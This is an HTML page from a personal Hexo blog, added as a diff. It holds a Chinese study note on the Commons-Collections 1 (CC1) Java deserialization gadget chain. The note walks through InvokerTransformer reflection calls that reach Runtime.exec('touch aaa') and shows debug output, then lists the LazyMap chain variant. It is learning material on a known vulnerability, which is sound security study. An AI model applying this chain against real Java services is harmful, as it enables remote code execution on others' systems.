@@ -1,0 +1,637 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/favicon.ico">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Jednersaous">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="Learning record for myself">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Java反序列化之CC1">
+<meta property="og:url" content="http://example.com/2025/04/04/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCC1/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Learning record for myself">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/java_des.png">
+<meta property="article:published_time" content="2025-04-03T21:00:00.000Z">
+<meta property="article:modified_time" content="2025-04-08T06:44:19.300Z">
+<meta property="article:author" content="Jednersaous">
+<meta property="article:tag" content="Java">
+<meta property="article:tag" content="反序列化">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/img/java_des.png">
+  
+  
+  
+  <title>Java反序列化之CC1 - Hexo</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+</head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Hello, it&#39;s jednersaous</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Java反序列化之CC1"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-04-04 05:00" pubdate>
+          2025年4月4日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.1k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          10 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Java反序列化之CC1</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h1><p>参考：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/1vxyz/p/17284838.html">https://www.cnblogs.com/1vxyz/p/17284838.html</a><br>环境：<code>jdk8u65 &amp;&amp; commons-collections 3.2.1</code><br>CC1在jdk8u71后就修复了(修了AnnotationInvocationHandler::readObject())<br>sink点在 InvokerTransformer::transform()</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell">Gadget chain:<br>    ObjectInputStream.readObject() -&gt;<br>        AnnotationInvocationHandler.readObject() -&gt;<br>            MapEntry.setValue() -&gt;<br>                TransformedMap.checkSetValue -&gt;<br>                    ChainedTransformer.transform() -&gt;<br>                        ConstantTransformer.transform() -&gt;<br>                        InvokerTransformer.transform() -&gt;<br>                            Method.invoke() -&gt;<br>                                Class.getMethod() -&gt;<br>                        InvokerTransformer.transform() -&gt;<br>                            Method.invoke() -&gt;<br>                                Runtime.getRuntime() -&gt;<br>                        InvokerTransformer.transform() -&gt;<br>                            Method.invoke() -&gt;<br>                                Runtime.exec()<br></code></pre></td></tr></table></figure>
+<p>Runtime对象不能序列化(没有继承Serializable) 我们需要一直用InvokerTransformer::transform()来反射获取<code>Runtime.getRuntime().exec(&quot;cmd&quot;)</code><br>这里详解一下InvokerTransformer::transform()</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object input)</span> &#123;<br>    <span class="hljs-keyword">if</span> (input == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> input.getClass();<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> cls.getMethod(iMethodName, iParamTypes);<br>        <span class="hljs-keyword">return</span> method.invoke(input, iArgs);<br>                <br>    &#125; <span class="hljs-keyword">catch</span> (NoSuchMethodException ex) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FunctorException</span>(<span class="hljs-string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="hljs-string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="hljs-string">&quot;&#x27; does not exist&quot;</span>);<br>    &#125; <span class="hljs-keyword">catch</span> (IllegalAccessException ex) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FunctorException</span>(<span class="hljs-string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="hljs-string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="hljs-string">&quot;&#x27; cannot be accessed&quot;</span>);<br>    &#125; <span class="hljs-keyword">catch</span> (InvocationTargetException ex) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FunctorException</span>(<span class="hljs-string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="hljs-string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="hljs-string">&quot;&#x27; threw an exception&quot;</span>, ex);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>以<code>new InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123;String.class, Class[].class&#125;, new Object[] &#123;&quot;getRuntime&quot;, null&#125;).transform(Runtime.class)</code>为例<br>首先明确 InvokerTransformer的构造函数接收(String, Class[], Object[])<br>所以这里的iMethodName是”getMethod”<br>paramTypes是{String.class, Class[].class}<br>iArgs是{“getRuntime”, null}<br>input是Runtime.class<br>进到try语句里看 不妨把输出都打印出来</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">System.out.println(<span class="hljs-string">&quot;cls:&quot;</span> + Runtime.class.getClass());<br>System.out.println(<span class="hljs-string">&quot;method:&quot;</span> + Runtime.class.getClass().getMethod(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;String.class, Class[].class&#125;));<br>-&gt;<br>cls:<span class="hljs-keyword">class</span> <span class="hljs-title class_">java</span>.lang.Class<br>method:<span class="hljs-keyword">public</span> java.lang.reflect.Method java.lang.Class.getMethod(java.lang.String,java.lang.Class[]) <span class="hljs-keyword">throws</span> java.lang.NoSuchMethodException,java.lang.SecurityException<br></code></pre></td></tr></table></figure>
+<p>可能会对传入的paramTypes有点疑惑 实际上就是反射调用Class::getMethod的时候 要让paramTypes &#x3D; 你getMethod得到的这个方法需要传入的参数<br>像这里是调用getMethod得到getMethod 而getMethod的参数是(String, Class&lt;?&gt;…)<br>所以传入的是{String.class, Class[].class} 同时iParamTypes的类型是Class[] 故也就是 new Class[] {String.class, Class[].class}<br><img src="/img/cc1/17437517675805.png" srcset="/img/loading.gif" lazyload><br>用getMethod得到getMethod可能有点绕 可以用第二个getMethod -&gt; <code>new InvokerTransformer(&quot;invoke&quot;, new Class[] &#123;Object.class, Object[].class&#125;, new Object[] &#123;null, null&#125;).transform(prev)</code>得到invoke来解释<br><img src="/img/cc1/17437522556272.png" srcset="/img/loading.gif" lazyload><br>这里invoke的参数是(Object, Object…) 所以最终传入的是 new Class[] {Object.class, Object[].class}</p>
+<p>OK解释完getMethod 接着解释一下InvokerTransformer::transform的invoke</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">System.out.println(<span class="hljs-string">&quot;invoke return:&quot;</span> + Runtime.class.getClass().getMethod(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;String.class, Class[].class&#125;).invoke(Runtime.class, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;));<br>-&gt;<br>invoke <span class="hljs-keyword">return</span>:<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> java.lang.Runtime java.lang.Runtime.getRuntime()<br></code></pre></td></tr></table></figure>
+<p>我们知道invoke会返回一个Object 打断点调试之后看到返回的是Method对象 也就是java.lang.Runtime.getRuntime()这个Method对象 -&gt; 这个东西不是class 是Method extends Object<br><img src="/img/CC1/17437537963124.png" srcset="/img/loading.gif" lazyload><br>而这个Method对象即将是我们下一个的transform(input)的传入<br>我们需要知道最后执行命令是在<code>return method.invoke(input, iArgs);</code><br>接下来我们把三次反射在transform中的cls, method, invoke_return都打印出来</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java">System.out.println(<span class="hljs-string">&quot;cls: &quot;</span> + Runtime.class.getClass());<br>System.out.println(<span class="hljs-string">&quot;method: &quot;</span> + Runtime.class.getClass().getMethod(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;String.class, Class[].class&#125;));<br><span class="hljs-type">Object</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> Runtime.class.getClass().getMethod(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;String.class, Class[].class&#125;).invoke(Runtime.class, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;);<br>System.out.println(<span class="hljs-string">&quot;invoke return: &quot;</span> + a);<br>System.out.println(<span class="hljs-string">&quot;cls_2: &quot;</span> + a.getClass());<br>System.out.println(<span class="hljs-string">&quot;method_2: &quot;</span> + a.getClass().getMethod(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;Object.class, Object[].class&#125;));<br><span class="hljs-type">Object</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> a.getClass().getMethod(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;Object.class, Object[].class&#125;).invoke(a, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;);<br>System.out.println(<span class="hljs-string">&quot;invoke return_2: &quot;</span> + b);<br>System.out.println(<span class="hljs-string">&quot;cls_3: &quot;</span> + b.getClass());<br>System.out.println(<span class="hljs-string">&quot;method_3: &quot;</span> + b.getClass().getMethod(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;String.class&#125;));<br><span class="hljs-type">Object</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> b.getClass().getMethod(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;String.class&#125;).invoke(b, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;<span class="hljs-string">&quot;touch aaa&quot;</span>&#125;);<br>System.out.println(<span class="hljs-string">&quot;invoke return_3: &quot;</span> + c);<br>System.out.println(<span class="hljs-string">&quot;get all done&quot;</span>);<br>-&gt;<br>cls: <span class="hljs-keyword">class</span> <span class="hljs-title class_">java</span>.lang.Class<br>method: <span class="hljs-keyword">public</span> java.lang.reflect.Method java.lang.Class.getMethod(java.lang.String,java.lang.Class[]) <span class="hljs-keyword">throws</span> java.lang.NoSuchMethodException,java.lang.SecurityException<br>invoke <span class="hljs-keyword">return</span>: <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> java.lang.Runtime java.lang.Runtime.getRuntime()<br>cls_2: <span class="hljs-keyword">class</span> <span class="hljs-title class_">java</span>.lang.reflect.Method<br>method_2: <span class="hljs-keyword">public</span> java.lang.Object java.lang.reflect.Method.invoke(java.lang.Object,java.lang.Object[]) <span class="hljs-keyword">throws</span> java.lang.IllegalAccessException,java.lang.IllegalArgumentException,java.lang.reflect.InvocationTargetException<br>invoke return_2: java.lang.Runtime@28d93b30<br>cls_3: <span class="hljs-keyword">class</span> <span class="hljs-title class_">java</span>.lang.Runtime<br>method_3: <span class="hljs-keyword">public</span> java.lang.Process java.lang.Runtime.exec(java.lang.String) <span class="hljs-keyword">throws</span> java.io.IOException<br>invoke return_3: java.lang.UNIXProcess@7b23ec81<br>get all done<br></code></pre></td></tr></table></figure>
+<p>据此我们可以列出三次反射的最后命令调用</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">1: java.lang.Class.getMethod::invoke(Runtime.class, &quot;getRuntime&quot;)<br><span class="hljs-meta prompt_">-&gt; </span><span class="language-bash">java.lang.Runtime.getRuntime()</span><br>2: java.lang.reflect.invoke::invoke(java.lang.Runtime.getRuntime(), null)<br><span class="hljs-meta prompt_">-&gt; </span><span class="language-bash">java.lang.Runtime@28d93b30</span><br>3: java.lang.Runtime.exec::invoke(java.lang.Runtime@28d93b30, &quot;touch aaa&quot;)<br><span class="hljs-meta prompt_">-&gt; </span><span class="language-bash">java.lang.UNIXProcess@7b23ec81</span><br></code></pre></td></tr></table></figure>
+<p>第一步 等价于 Runtime.class.getMethod(“getRuntime”) 并返回一个 java.lang.Runtime.getRuntime()的Method<br>第二步 等价于 getRuntimeMethod.invoke(null, null) 并返回一个Runtime的实例<br>第三步 等价于 Runtime实例.exec(“touch aaa”) 并返回一个UNIX进程</p>
+<p>到此我们Runtime命令执行的反序列化完成 接下来就是把它们连续调用transform给串起来</p>
+<p>这里ChainedTransformer是必须的 有点巧妙的感觉 就像是正好CC库里有这样一个非常容易成为攻击的点一样</p>
+<p>LazyMap的打法我怎么没弄懂呢 感觉还是得看一下cc6才能懂 先贴一下gadget chain</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell">/*<br>	Gadget chain:<br>		ObjectInputStream.readObject()<br>			AnnotationInvocationHandler.readObject()<br>				Map(Proxy).entrySet()<br>					AnnotationInvocationHandler.invoke()<br>						LazyMap.get()<br>							ChainedTransformer.transform()<br>								ConstantTransformer.transform()<br>								InvokerTransformer.transform()<br>									Method.invoke()<br>										Class.getMethod()<br>								InvokerTransformer.transform()<br>									Method.invoke()<br>										Runtime.getRuntime()<br>								InvokerTransformer.transform()<br>									Method.invoke()<br>										Runtime.exec()<br>*/<br></code></pre></td></tr></table></figure>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Java/" class="print-no-link">#Java</a>
+      
+        <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="print-no-link">#反序列化</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Java反序列化之CC1</div>
+      <div>http://example.com/2025/04/04/Java反序列化之CC1/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Jednersaous</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年4月4日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/04/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCC6/" title="Java反序列化之CC6">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Java反序列化之CC6</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/04/02/%E4%BF%A1%E5%91%BCOA%E6%89%93%E7%82%B9/" title="信呼OA打点">
+                        <span class="hidden-mobile">信呼OA打点</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
